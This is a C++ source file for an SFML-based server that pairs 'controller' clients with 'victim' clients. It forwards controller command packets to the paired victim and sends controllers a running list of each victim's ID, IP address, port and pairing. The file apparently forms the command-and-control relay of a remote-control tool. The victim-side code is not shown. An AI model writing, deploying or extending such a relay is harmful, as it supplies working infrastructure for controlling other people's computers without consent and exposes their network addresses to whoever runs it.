#include "server.h"

Server::Server()
{
	if (listener.listen(PORT) != sf::Socket::Done) {
		std::cout << "listening failed\n";
		std::exit(-1);
	}	
	selector.add(listener);
	std::cout << "listening on port " << PORT << "\n";
}

void Server::receive()
{
	if (!selector.wait())
		return;
	
	//check if a client has received something
	for (int i = 0; i < clients.size(); i++) {
		if (!selector.isReady(*clients[i].socket))
			continue;
	
		sf::Packet p;
		clients[i].socket->receive(p);

		//disconnect client
		if (p.getDataSize() == 0) {
			disconnect(i);
			break;
		}

		//process packet according to sender's role
		if (clients[i].role == 'c')
			processControllerMsg(i, p);
		else if (clients[i].role == 'v')
			processVictimMsg(i, p);
		else if (clients[i].role == '-') {
			sf::Uint8 role;
			p >> role;
			p.clear();
			
			if (role == 'c' || role == 'v') {
				p << sf::Uint8(role);
				if (role == 'c')
					p << sf::Uint16(clients[i].id);
				clients[i].socket->send(p);
				clients[i].role = role;

				updateControllersList();
			}
			else {
				p << sf::Uint8('?');
				clients[i].socket->send(p);
			}
		}
	
		break;
	}
	//check if a client is ready to connect
	if (selector.isReady(listener)) {
		Client c(++currentId);
		if (listener.accept(*c.socket) == sf::Socket::Done) {
			selector.add(*c.socket);
			clients.push_back(c);
		}
		else {
			delete c.socket;
			currentId--;
		}
	}
}

void Server::processControllerMsg(int i, sf::Packet p)
{
	sf::Uint8 cmd;
	p >> cmd;

	//pair controller with victim
	if (cmd == 'p') {
		sf::Uint16 id;
		p >> id;
		if (clients[i].pair == nullptr) { 		
			for (auto& v : clients) {
				if (v.id == id) {
					if (v.role != 'v' || v.pair != nullptr)
						break;

					p.clear();
					p << sf::Uint8('p');
					clients[i].socket->send(p);

					v.pair = &clients[i];
					clients[i].pair = &v;
					updateControllersList();

					break;
				}
			}
		}

	}
	if ((cmd == 'm' || cmd == 'n') && clients[i].pair != nullptr) {
		clients[i].pair->socket->send(p);
	}
}

void Server::processVictimMsg(int i, sf::Packet p)
{
}

void Server::disconnect(int i)
{
	std::cout << clients[i].id << " disconnected\n";
	for (auto& c : clients) {
		if (c.pair != nullptr && c.pair->id == clients[i].id)
			c.pair = nullptr;
	}
	selector.remove(*clients[i].socket);
	delete clients[i].socket;
	clients.erase(clients.begin() + i);

	updateControllersList();
}

void Server::updateControllersList()
{
	auto sendControllers = [this](sf::Packet p) {
		for (auto& c : clients)
		{
			if (c.role == 'c')
				c.socket->send(p);
		}
	};

	sf::Packet p;
	p << sf::Uint8('q');
	sendControllers(p);

	for (const auto& c : clients) {
		if (c.role == '-')
			continue;

		p.clear();
		p << ((c.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.id << c.time;
		p << c.socket->getRemoteAddress().toInteger() << c.socket->getRemotePort();

		if (c.pair != nullptr)
			p << c.pair->id;
		else
			p << sf::Uint16(0);

		sendControllers(p);
	}

	p.clear();
	p << sf::Uint8('d');
	sendControllers(p);
}